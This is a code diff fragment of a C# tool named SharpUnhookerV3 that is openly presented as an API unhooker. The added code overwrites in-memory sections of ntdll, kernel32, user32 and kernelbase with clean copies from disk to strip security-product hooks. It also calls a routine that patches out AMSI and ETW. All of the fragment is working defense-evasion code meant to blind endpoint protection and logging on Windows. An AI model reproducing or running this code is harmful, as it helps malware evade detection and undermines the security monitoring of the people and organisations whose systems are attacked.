+                Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
+                Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                int SectionNumber = i;
+                if (assemblyBytes != null && assemblyBytes.Length > 0) {
+					IntPtr InMemorySectionPointer = (GetModuleHandle(DLLname)) + (int)OriginalDLL.ImageSectionHeaders[SectionNumber].VirtualAddress;
+					uint oldProtect;
+	    			bool updateProtection = VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, 0x40, out oldProtect);
+	    			if (updateProtection) {
+	    				IntPtr WPMOutput;
+						bool patchdll = WriteProcessMemory(Process.GetCurrentProcess().Handle, InMemorySectionPointer, assemblyBytes, assemblyBytes.Length, out WPMOutput);
+						if (patchdll) {
+							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData];
+							IntPtr readPatchedAPI = InMemorySectionPointer;
+							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData);
+							bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
+							uint newProtect;
+							VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, out newProtect);
+							if (!checkAssemblyBytesAfterPatched) {
+								Console.WriteLine("[-] Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked! [-]");
+							}else {
+								Console.WriteLine("[+++] API IS UNHOOKED! [+++]");
+							}
+						}else {
+							Console.WriteLine("[-] Patch unsucessful! [-]");
+						}
+	    			}else {
+						Console.WriteLine("[-] Failed to update memory protection setting! [-]");
+					}
+	    		}else {
+	    			Console.WriteLine("[-] Reading original DLL from disk failed! [-]");
+	    		}
+            }
     	}
     }
+
     public static void Main() {
-    	Console.WriteLine("----------------------------------------");
-    	Console.WriteLine("SharpUnhookerV2 - C# Based API Unhooker.");
+		Console.WriteLine("[--------------------------------------]");
+    	Console.WriteLine("SharpUnhookerV3 - C# Based API Unhooker.");
     	Console.WriteLine("        Written By GetRektBoy724        ");
-    	UnhookNTAll();
+    	Console.WriteLine("[--------------------------------------]");
+    	Console.WriteLine("[++++++++++!SEQUENCE=STARTED!++++++++++]");
+    	Console.WriteLine("--------PHASE 1 == API UNHOOKING--------");
+    	// if you want to add more on here,dont forget the ".dll" extension!
+    	// and the DLL needs to be on C:\Windows\System32\ directory!
+    	SilentUnhooker("ntdll.dll");
+    	SilentUnhooker("kernel32.dll");
+    	SilentUnhooker("user32.dll");
+    	SilentUnhooker("kernelbase.dll");
+    	Console.WriteLine("----PHASE 2 == PATCHING AMSI AND ETW----");
+    	PatchAMSIAndETW.Main();
+    	Console.WriteLine("[+++++++++!SEQUENCE==FINISHED!+++++++++]");
     }
 }
